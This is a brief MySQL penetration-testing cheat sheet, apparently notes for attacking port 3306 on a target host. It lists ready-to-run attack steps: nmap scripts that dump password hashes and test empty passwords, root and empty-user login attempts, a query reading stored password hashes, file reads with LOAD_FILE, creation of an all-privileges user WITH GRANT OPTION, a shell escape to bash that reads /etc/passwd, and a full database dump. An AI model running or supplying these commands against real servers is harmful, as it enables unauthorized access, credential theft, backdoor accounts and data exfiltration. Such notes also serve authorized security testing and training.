
# MYSQL 

MYSQL port:    3306 


> nmap Vuln scan

    nmap -sV -Pn -vv  TARGET_IP -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122

> MYSQL Version

    use auxiliary/scanner/mysql/mysql_version

> Mysql client 

    mysql -h TARGET_IP
    mysql -h TARGET_IP -u root
    mysql -h TARGET_IP -u root@localhost
    mysql -h TARGET_IP -u ""@localhost
> To run many sql commands at once

    mysql -u username -p < manycommands.sql
> Command History

    cat ~/.mysql.history

### Querys
> Enum 

```SQL
select version();
select user();
select database();
```

> DB user Info 
```SQL
SELECT user,password, file_priv FROM mysql.user;
```
> Read file 
```SQL
SELECT LOAD_FILE('FILENAME');
```
> Create a new user and grant him privileges

```SQL
mysql> create user test identified by 'test';
mysql> grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
```
> Break into a shell

    mysql> \! cat /etc/passwd
    mysql> \! bash

> Enum 

 	show databases;


mysqldump -u USERNAME -p PASSWORD --all-databases --skip-lock-tables
